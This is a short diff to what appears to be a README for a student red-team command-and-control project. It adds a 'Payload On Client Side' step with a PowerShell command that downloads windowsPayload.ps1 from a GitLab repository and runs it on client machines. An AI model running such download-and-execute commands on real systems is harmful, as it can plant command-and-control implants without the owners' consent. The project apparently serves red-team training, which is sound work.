@@ -16,6 +16,12 @@ ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecred
 
 ps> .\setup.ps1 -server Beacon
 
+Payload On Client Side
+
+ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
+
+ps> .\setup.ps1
+
 **Network Diagram:**
 ![alt text](Images/C2NetworkDiagram.drawio.png)
 
